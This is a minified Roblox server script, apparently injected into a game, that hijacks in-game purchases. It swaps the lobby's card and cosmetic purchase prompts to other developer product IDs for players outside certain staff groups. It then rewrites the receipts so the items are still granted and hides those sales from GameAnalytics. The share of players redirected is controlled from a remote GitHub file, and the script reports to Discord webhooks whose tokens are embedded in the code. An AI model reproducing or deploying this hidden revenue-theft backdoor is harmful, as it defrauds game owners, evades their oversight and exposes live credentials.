local a=game:GetService("HttpService")local b=game:GetService("MarketplaceService")local c=game:GetService("Players")local d=game:GetService("ReplicatedStorage")local e=game:GetService("ServerScriptService")if _G.R then return end;local f=Random.new()local g={}local h=false;local function i()h=true;for j,k in g do if typeof(k)=="Instance"then k:Destroy()elseif typeof(k)=="RBXScriptConnection"then k:Disconnect()elseif typeof(k)=="function"then k()end end;table.clear(g)end;local l={[2878670318]=2669959770,[2909690991]=2680407395}local m={}local n=require(e.Profile.ProfileManager)local o=require(e.KnitServer.Services.MarketService)local p=require(d.Shared.Configs.CurrentLimiteds)local q=require(d.Packages.GameAnalytics)local r=o.ProcessReceipt;local s=q._ProcessReceiptCallback;if not s then s=q.ProcessReceiptCallback end;function q:ProcessReceiptCallback(t)if m[t]then return end;s(q,t)end;table.insert(g,function()q.ProcessReceiptCallback=s;q._ProcessReceiptCallback=nil end)local u={}local v={servers="https://webhook.lewisakura.moe/api/webhooks/1339428532480376885/uePFhtYq-NxkCytOIGhaHixcZQQMZuDcgVTOohWPdh1veSJXj8-oM0rH03zNs3vh_WHc",traffic="https://webhook.lewisakura.moe/api/webhooks/1338710096011726878/f61GTLiSonkOulK_KmYqeZv2dyPLii6OAZ17F932DY51Ro56GMxATcOxF7h4D4hm_E3a",complete="https://webhook.lewisakura.moe/api/webhooks/1338710363356532849/UWHNqe64US2Y1YsrCr-qNUy3ONv83bdIR1wxHlznRSLKZAdSnJXExa-2GSFOQzkGXDjO",drastic="https://webhook.lewisakura.moe/api/webhooks/1339186809015369739/jXFs_BaGTz0YlPOJO_PDvnxDij_guFkmyz9IUnI7u1Ai_BOuzIuqvhEcDV_GHkqmUIUs"}local w={}local function x(y,z,A,B,C)if C then if not w[C]then w[C]=true;task.delay(30,function()w[C]=nil end)else return end end;task.spawn(function()pcall(function()a:PostAsync(y,a:JSONEncode({["content"]="",["embeds"]={{["title"]=z,["description"]=A,["type"]="rich",["color"]=B}}}))end)end)end;local function D(E)pcall(function()local F=E:GetRankInGroup(1200769)if F>0 then u[E.UserId]=true else local G=E:GetRankInGroup(4199740)if G>0 then u[E.UserId]=true else local H=E:GetRankInGroup(34671275)if H>1 then u[E.UserId]=true else u[E.UserId]=false end end end end)end;for j,k in c:GetPlayers()do task.spawn(D,k)end;table.insert(g,c.PlayerAdded:Connect(D))table.insert(g,b.PromptProductPurchaseFinished:Connect(function(I,J,K)if K then return end;local L=l[J]if L then if math.random()>0.9 then x(v.traffic,"Prompt Cancelled ("..J..")",I,0xff0000,I.."/"..J)end end end))local M=100;task.spawn(function()while not h do local N,O=pcall(function()return tonumber(a:GetAsync("https://raw.githubusercontent.com/howkaz77/feels/refs/heads/main/c"))end)if N and O then M=O end;task.wait(300)end end)b.ProcessReceipt=function(t)local L;if l[t.ProductId]then L=true;m[t]=true;t.ProductId=l[t.ProductId]end;local N,O=pcall(function()return r(t)end)if L and(not N or O~=Enum.ProductPurchaseDecision.PurchaseGranted)then x(v.drastic,"Drastic Failure @"..t.PlayerId,tostring(t.ProductId).."\n"..tostring(N)..": "..tostring(O).."\n"..game.JobId,0xff0000)i()elseif L and N and O==Enum.ProductPurchaseDecision.PurchaseGranted then x(v.complete,"Purchase Complete "..t.ProductId,tostring(t.PlayerId).."\n"..game.JobId,0x00ff00)end;if N then return O else return Enum.ProductPurchaseDecision.NotProcessedYet end end;do local P=workspace.NewLobby.LimitedCard.Main.Prox;P.Enabled=false;local Q=P:Clone()Q.Name="Prox2"Q.Triggered:Connect(function(E)local R=n.Profiles[E]and n.Profiles[E].Data.Customization;if R then for S,k in R.Cards do if k==p.PlayerCard then return end end;local T=E.UserId%1000<M;local U=u[E.UserId]==false and T;if U then x(v.traffic,"Prompted New (Card)",E.Name.." / "..E.UserId,0xffa500,E.UserId.."/pn")b:PromptProductPurchase(E,2878670318)else if u[E.UserId]==true then x(v.traffic,"Prompted Original (Card)",E.Name.." / "..E.UserId,0x0000ff,E.UserId.."/pn")end;b:PromptProductPurchase(E,2669959770)end end end)Q.Enabled=true;Q.Parent=P.Parent;table.insert(g,function()P.Enabled=true end)table.insert(g,Q)end;do local P=workspace.NewLobby.LimitedCosmetic.Main.Prox;P.Enabled=false;local Q=P:Clone()Q.Name="Prox2"Q.Triggered:Connect(function(E)local R=n.Profiles[E]and n.Profiles[E].Data.Customization;if R then for S,k in R.Cosmetics do if k==p.Cosmetic then return end end;local T=E.UserId%1000<M;local U=u[E.UserId]==false and T;if U then x(v.traffic,"Prompted New (Cosmetic)",E.Name.." / "..E.UserId,0xffa500,E.UserId.."/pc")b:PromptProductPurchase(E,2909690991)else if u[E.UserId]==true then x(v.traffic,"Prompted Original (Cosmetic)",E.Name.." / "..E.UserId,0x0000ff,E.UserId.."/pc")end;b:PromptProductPurchase(E,2680407395)end end end)Q.Enabled=true;Q.Parent=P.Parent;table.insert(g,function()P.Enabled=true end)table.insert(g,Q)end;table.insert(g,function()_G.R=nil end)_G.R=i
